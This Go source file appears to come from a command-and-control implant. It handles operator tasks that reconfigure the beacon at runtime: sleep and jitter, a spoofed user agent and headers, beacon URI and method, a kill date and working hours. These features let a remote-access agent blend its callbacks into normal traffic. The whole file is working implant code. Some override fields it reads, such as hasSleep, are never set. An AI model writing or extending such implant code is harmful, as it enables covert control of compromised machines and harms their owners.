//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"encoding/json"
	"fmt"
	"strconv"
	"strings"
	"sync"
	"time"
)

type ConfigOverride struct {
	Sleep        int               `json:"sleep"`
	Jitter       int               `json:"jitter"`
	UserAgent    string            `json:"user_agent"`
	Headers      map[string]string `json:"headers"`
	BeaconURI    string            `json:"beacon_uri"`
	Method       string            `json:"method"`
	WorkingStart string            `json:"working_start,omitempty"`
	WorkingEnd   string            `json:"working_end,omitempty"`
	WorkingTZ    string            `json:"working_tz,omitempty"`
}

var configOverrides struct {
	sync.RWMutex
	sleep     int // 0 = not set
	jitter    int // 0 = not set
	userAgent string
	headers   map[string]string
	beaconURI string
	method    string
	hasSleep  bool
	hasJitter bool
}

func handleConfigPush(task Task, res *TaskResult) {
	if task.Data == "" {
		res.Error = "config_push: empty data"
		return
	}
	var cfg ConfigOverride
	if err := json.Unmarshal([]byte(task.Data), &cfg); err != nil {
		res.Error = "config_push: invalid json: " + err.Error()
		return
	}
	configOverrides.Lock()
	defer configOverrides.Unlock()
	if cfg.Sleep > 0 {
		IntervalStr = strconv.Itoa(cfg.Sleep)
	}
	if cfg.Jitter > 0 {
		JitterStr = strconv.Itoa(cfg.Jitter)
	}
	if cfg.UserAgent != "" {
		configOverrides.userAgent = cfg.UserAgent
	}
	if cfg.Headers != nil {
		normalized := make(map[string]string, len(cfg.Headers))
		for k, v := range cfg.Headers {
			normalized[strings.TrimSpace(k)] = v
		}
		configOverrides.headers = normalized
	}
	if cfg.BeaconURI != "" {
		configOverrides.beaconURI = cfg.BeaconURI
	}
	if cfg.Method != "" {
		configOverrides.method = strings.ToUpper(cfg.Method)
	}
	if cfg.WorkingStart != "" {
		workingStart = cfg.WorkingStart
	}
	if cfg.WorkingEnd != "" {
		workingEnd = cfg.WorkingEnd
	}
	if cfg.WorkingTZ != "" {
		workingTZ = cfg.WorkingTZ
	}
	// Re-derive the typed globals (Interval/Jitter/etc.) from the canonical
	// string config so the overrides take effect and survive a later reparse.
	reparseNetworkConfig()
	res.Output = "config applied"
}

func getActiveSleep() int {
	configOverrides.RLock()
	defer configOverrides.RUnlock()
	if configOverrides.hasSleep {
		return configOverrides.sleep
	}
	return Interval
}

func getActiveJitter() int {
	configOverrides.RLock()
	defer configOverrides.RUnlock()
	if configOverrides.hasJitter {
		return configOverrides.jitter
	}
	return Jitter
}

func getActiveUserAgentFromConfig() string {
	configOverrides.RLock()
	defer configOverrides.RUnlock()
	if configOverrides.userAgent != "" {
		return configOverrides.userAgent
	}
	return UserAgent
}

func getActiveHeaders() map[string]string {
	configOverrides.RLock()
	defer configOverrides.RUnlock()
	if configOverrides.headers != nil {
		out := make(map[string]string, len(configOverrides.headers))
		for k, v := range configOverrides.headers {
			out[k] = v
		}
		return out
	}
	return nil
}

func getActiveBeaconURIFromConfig() string {
	configOverrides.RLock()
	uri := configOverrides.beaconURI
	configOverrides.RUnlock()
	if uri != "" {
		return uri
	}
	return getActiveBeaconURI()
}

func getActiveBeaconMethodFromConfig() string {
	configOverrides.RLock()
	method := configOverrides.method
	configOverrides.RUnlock()
	if method != "" {
		return method
	}
	return getActiveBeaconMethod()
}

func handleSetKillDate(task Task, res *TaskResult) {
	if task.Command == "" {
		res.Error = "set_kill_date: empty date"
		return
	}
	kd, err := time.Parse("2006-01-02", task.Command)
	if err != nil {
		res.Error = "set_kill_date: invalid date format: " + err.Error()
		return
	}
	killDateParsed = kd
	res.Output = "kill date set: " + task.Command
}

func handleClearKillDate(task Task, res *TaskResult) {
	killDateParsed = time.Time{}
	res.Output = "kill date cleared"
}

func handleSetWorkingHours(task Task, res *TaskResult) {
	if task.Data == "" {
		res.Error = "set_working_hours: empty data"
		return
	}
	var cfg struct {
		WorkingStart string `json:"working_start"`
		WorkingEnd   string `json:"working_end"`
		WorkingTZ    string `json:"working_tz"`
	}
	if err := json.Unmarshal([]byte(task.Data), &cfg); err != nil {
		res.Error = "set_working_hours: invalid json: " + err.Error()
		return
	}
	if cfg.WorkingStart != "" {
		workingStart = cfg.WorkingStart
	}
	if cfg.WorkingEnd != "" {
		workingEnd = cfg.WorkingEnd
	}
	if cfg.WorkingTZ != "" {
		workingTZ = cfg.WorkingTZ
	}
	res.Output = fmt.Sprintf("working hours set: %s-%s (tz=%s)", workingStart, workingEnd, workingTZ)
}
